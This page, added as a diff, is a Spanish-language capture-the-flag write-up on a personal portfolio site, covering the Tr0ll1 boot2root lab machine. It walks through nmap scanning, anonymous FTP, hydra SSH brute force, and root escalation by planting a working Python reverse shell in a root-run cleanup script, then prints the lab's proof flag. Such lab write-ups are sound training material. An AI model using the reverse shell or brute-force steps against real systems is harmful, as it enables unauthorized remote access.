@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TÍTULO DEL RETO</title>
+    <link href="../style/estilo.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <!-- Highlight.js para resaltar código -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <!-- Navbar -->
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeups.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <!-- Contenido del Write-up -->
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <!-- Título y fecha -->
+    <h1 class="text-4xl font-bold mb-2">🔹 Maquina: Troll1</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 29/07/2025 | Categoría: WEB / PWN / FORENSE / CRYPTO</p>
+
+    <!-- Introducción -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Tr0ll se inspiró en el constante troleo de las máquinas en los laboratorios de OSCP.
+            El objetivo es simple: obtener root y obtener Proof.txt del directorio /root.
+            ¡No apto para quienes se frustran fácilmente! ¡Advertencia: hay trolls por delante!
+            Dificultad: Principiante; Tipo: boot2root
+            ¡Un agradecimiento especial a @OS_Eagle11 y @superkojiman por su paciencia durante las pruebas hasta obtener root!
+            La máquina debería obtener una IP mediante DHCP. Si tienes algún problema, contáctame para obtener la contraseña y que funcione.
+            ¡Siempre agradezco tus comentarios!
+        </p>
+    </section>
+
+    <!-- Análisis -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            Explica los primeros pasos: enumeración, análisis de binario, revisión del tráfico, etc.
+        </p>
+
+        <!-- Ejemplo de bloque de código -->
+        <pre><code class="language-bash">
+            # Ejemplo: escaneo con nmap
+            sudo nmap -O -sV 192.168.56.108
+
+            # Resultado:
+            PORT   STATE SERVICE VERSION
+            21/tcp open  ftp     vsftpd 3.0.2
+            22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2(Ubuntu Linux; protocol 2.0)
+            80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+            
+        </code></pre>
+
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis siguiente</h2>
+        <p class="text-gray-300 mb-4">
+            Si bien pagina solo contenia una imagen troll y al buscar directorios no encontraria nada importante
+            , si pude conectarme de manera anonima a ftp, el cual me dejo descargar un archivo llamado lol.pcap 
+            en el cual  encontre el mensaje de:
+            Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
+            Sucks, you were so close... gotta TRY HARDER!
+
+            Despues me di cuenta que sup3rs3cr3tdirlol era un directorio, en este descargue un archivo roflmao
+        </p>
+        <pre><code class="language-python">
+            ./roflmao
+            Find address 0x0856BF to proceed%   
+        </code></pre>
+
+        <p class="text-gray-300 mb-4">
+            Cuando vi esto 0x0856BF pense que se trataba de una explotación de binarios,
+            muy probablemente relacionado con un buffer overflow, donde el programa te da una dirección de memoria específica (0x0856BF)
+            pero no habia nada y una vez mas era una direccion, tenia dos archivos los cuales eras los usuarios y contraseñas.
+            con estos aplycamos fueza bruta en ssh
+        </p>
+        <pre><code class="language-python">
+            hydra -L user.txt -p Pass.txt ssh://192.168.56.108
+            host: 192.168.56.108   login: overflow   password: Pass.txt
+        </code></pre>
+    </section>
+
+    <!-- Explotación / Resolución -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Explotación / Resolución</h2>
+        <p class="text-gray-300 mb-4">
+            Ya tenenia acceso pero tenia que elevar mis privilegios, encontre un archivo llamado
+            cleaner.py el cual se ejecutaba para limpiar /tmp/* cada cierto tiempo, a este lo modifique ya que tenia los permisos
+            y hice un Payload reverse shell en Python y asi obtuve el user de root.
+        </p>
+
+        <pre><code class="language-python">
+            #!/usr/bin/env python
+            import sys
+            import socket
+            import subprocess
+            import os
+
+            ip = "192.168.56.107"  # entre comillas
+            port = 4444
+
+            s = socket.socket()
+            s.connect((ip, port))
+
+            os.dup2(s.fileno(), 0)  # stdin
+            os.dup2(s.fileno(), 1)  # stdout
+            os.dup2(s.fileno(), 2)  # stderr
+
+            subprocess.call(["/bin/sh", "-i"])
+        </code></pre>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Finalmente, lei el archivo proof.txt y obtuve la flag:
+        </p>
+            <pre><code class="language-python">
+                cat proof.txt
+                    Good job, you did it! 
+                    702a8c18d29c6f3ca0d99ef5712bfbdc
+            </code></pre>
+        
+    </section>
+
+    <!-- Botón para volver -->
+    <div class="mt-10">
+        <a href="../writeups.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
